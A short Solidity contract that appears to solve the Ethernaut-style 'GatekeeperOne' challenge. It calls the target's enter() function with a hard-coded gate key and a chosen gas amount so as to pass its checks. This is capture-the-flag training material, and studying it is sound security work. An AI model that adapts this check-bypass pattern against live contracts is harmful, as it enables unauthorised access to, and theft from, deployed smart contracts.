pragma solidity ^0.8.0;

interface GatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract AttackerContractV4 {
    address public instance;

    constructor(address _instance) {
        instance = _instance;
    }

    function getGateKey() internal pure returns (bytes8) {
        return bytes8(uint64(0x0000133700002266));
    }

    function attack() external {
        GatekeeperOne(instance).enter{gas: 8191 * 3}(getGateKey());
    }
}
